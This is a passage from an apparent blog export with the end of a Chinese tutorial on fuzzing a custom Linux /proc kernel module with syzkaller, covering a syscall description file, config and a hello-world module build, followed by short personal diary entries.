用新的内核启动虚拟机，查看模块是否加载成功\n\n```shell\n# 查看模块对应设备节点是否存在\nls /proc/test\n# 查看模块加载时的log信息\ndmesg | grep \"proc init\"\n```\n\n### 5.2.2 定制txt系统调用描述文件\n\n1. syzkaller源码中，找到sys/linux/目录，新建一个文件，命名为`proc_operation.txt`，内容如下：\n\n```\ninclude <linux/fs.h>\n\nopen$proc(file ptr[in, string[\"/proc/test\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd\nread$proc(fd fd, buf buffer[out], count len[buf]) len[buf]\nwrite$proc(fd fd, buf buffer[in], count len[buf]) len[buf]\nclose$proc(fd fd)\n\nproc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\nproc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n```\n\n2. 使用syz-extract生成const文件。指定txt文件名，可单独生成该文件对应的const文件。\n\n```shell\nbin/syz-extract -os linux -sourcedir \"/home/bling/Downloads/linux-5.5.1\" -arch amd64 proc_operation.txt\n```\n\n3. 运行syz-sysgen\n4. 重新编译syzkaller\n\n```shell\nmake clean\nmake\n```\n\n### 5.2.3 验证能否成功触发crash\n\n启动syzkaller的配置文件如下。为了更快看到crash结果，增加了“enable_syscalls”项，只允许某些系统调用，效率更快。\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"enable_syscalls\":[\n        \t\t\"open$proc\",\n        \t\t\"read$proc\",\n        \t\t\"write$proc\",\n        \t\t\"close$proc\"\n        ],\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n启动syzkaller进行测试：\n\n```\n./bin/syz-manager -config=abcd.cfg\n```\n\n触发到漏洞分支！\n\n![](syzkaller-display1.png)\n\n![](syzkaller-display2.png)\n\n![](syzkaller-display3.png)\n\n## 5.3 txt文件语法\n\nhttp://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller-demo.html\n\n## 5.4 config文件\n\n[config文件示例](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/testdata/qemu.cfg)\n\n[config文件参数详解](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/config.go)\n\n# 编译ko的方法\n\ntest.c\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n \nMODULE_LICENSE(\"Dual BSD/GPL\");\n \nstatic int hello_init(void)\n{\n        printk(KERN_ALERT \"Hello, world\\n\");\n        return 0;\n}\n \nstatic void hello_exit(void)\n{\n        printk(KERN_ALERT \"Goodbye, cruel world\\n\");\n}\n \nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nMakefile\n\n```shell\nobj-m := testxy.o\n\nKDIR = /home/bling/Downloads/linux-5.5.1/\n\nall:\n        make -C $(KDIR) M=$(PWD) modules \n\nclean:\n        rm -rf *.o *.ko *.mod.* *.symvers *.order\n```\n\n\n\n# 参考文章推荐\n\n[内核漏洞挖掘技术系列(4)——syzkaller(1)](https://xz.aliyun.com/t/5079?spm=5176.12901015.0.i12901015.3af8525coJ6I6t)\n\n[【漏洞挖掘】使用Syzkaller&QEMU捕捉内核堆溢出Demo](https://www.jianshu.com/p/790b733f80a2)\n\n[Syzkaller Crash Demo](http://pwn4.fun/2019/10/09/Syzkaller-Crash-Demo/)\n\n\n\n\n\n\n\n","categories":["Fuzzing"]},{"title":"things","url":"/1994/10/23/things/","content":"\n# 20200523\n\n忙碌的一天\n\n- 8:40被电话吵醒去营业厅办宽带。\n- 10:20喊物业来家里修水池。\n- 11:00外卖到了，吃早午饭。\n- 11:30装宽带的师傅来安装光猫，调试。\n- 12:50跟氕氕约着一起去按摩肩颈疏通下经络，然后又刮了个痧，现在整个背又痛又不能看。但是真的舒服。\n- 15:30去公司赶项目报告。\n- 18:30一个人在公司楼下吃了个晚饭。食堂比外卖好吃多了。\n- 19:00坐公交车遇到一个凶凶的司机。\n- 20:30男票带我一起研究了一下我俩突然无法翻墙的服务器，如下图所示。原因是GFW把我们服务器发回的ACK响应包给截了。哈哈哈有用的知识又增加了！\n\n![](evil-gfw.png)\n\n# 20200919\n\n突发奇想，想要捡起从初中开始就很喜欢但从高中毕业就没好好学过的英语。曲曲折折绕了一圈又一圈，最终还是会回到心中的原点。一个人一辈子只做一件事，并且能一直做好，也是一件很了不起的事情啊。\n\n给自己定个小目标吧，明年把CATTI二级考过，扎实一下翻译功底。加油加油！\n\n\n\n# 20201117\n\n时间过得可真快。一天天都干了啥呢。","categories":["Life"]}]